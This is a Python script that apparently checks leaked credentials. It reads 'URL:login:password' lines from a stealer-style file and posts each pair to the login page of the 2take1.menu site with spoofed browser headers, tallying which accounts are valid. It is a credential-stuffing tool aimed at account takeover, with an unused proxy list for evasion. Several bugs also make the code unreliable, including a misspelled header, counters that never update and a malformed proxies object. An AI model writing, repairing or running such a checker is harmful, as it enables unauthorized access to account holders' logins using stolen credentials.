import requests, os, json

with open("config.json", "r") as config:
    data = json.load(config)

def getType(type):
    if type == "2take1":
        return data["checker"]["url_formatting"]["2take1"]
            
valids = 0
invalids = 0

def load_accs(type):
    valid_lines = []
    seen_lines = set()
    file_path = input("input file path: ")
    with open(file_path, "r") as lines:
        for line in lines:
            if line in seen_lines:
                continue
            seen_lines.add(line)
            
            modified_line = line
            for url in getType(type):
                if url in line:
                    modified_line = modified_line.replace(url, "").strip()
            
            if modified_line != line:
                valid_lines.append(modified_line)
            else:
                print("invalid")
    return valid_lines

def console():
    if os.name == 'nt':        
        os.system("title Checker")
        print(f"Valids: {valids} \nInvalids: {invalids}")
    else:
        return 0

def check(modified_line, type):
    url = "https://2take1.menu/login"

    payload = {
        "username": modified_line.split(":")[0],
        "password": modified_line.split(":")[1],
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'Accept': 'text/html',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'X-Requested-With': 'XMLHttpRequest',
        'Acept': '*',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Content-Type': 'application/json',
        'Content-Length': '99',
        'Origin': 'https://2take1.menu',
        'Connection': 'keep-alive'
    }

    proxies = {
        "http://username:password@ip:port",
        "https://username:password@ip:port"
    }

    response = requests.post(url, data=payload, headers=headers)
    print(response.raw())
    print(f"[TRYING] {modified_line}")

def main():

    lines = load_accs("2take1")
    console()
    for line in lines:
        check(line, "2take1")
    input("Press Enter to exit...")

if __name__ == '__main__':
    main()

    # /home/fxy/Documents/2tal/UrlLoginPass.txt